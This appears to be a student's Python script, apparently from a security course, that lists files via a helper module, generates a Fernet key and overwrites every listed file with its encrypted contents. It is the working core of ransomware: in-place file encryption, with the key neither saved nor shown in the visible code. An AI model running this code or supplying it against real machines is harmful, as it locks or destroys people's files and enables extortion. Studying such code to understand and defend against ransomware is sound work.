# Nathan Park
# nyp5aa

from cryptography.fernet import Fernet
from helpers import generate_sym_key, get_files


def main():
    files = get_files()
    print(files)
    key = generate_sym_key()
    encrypt_files(files, key)
    return

def encrypt_files(files, key):
    fernet = Fernet(key)
    for file in files:
        # Get data from normal file
        with open(file, 'rb') as f:
            data = f.read()

        # Encrypt the data
        encrypted = fernet.encrypt(data)

        # Write over the file
        with open(file, 'wb') as f:
            f.write(encrypted)


if __name__ == "__main__":
    main()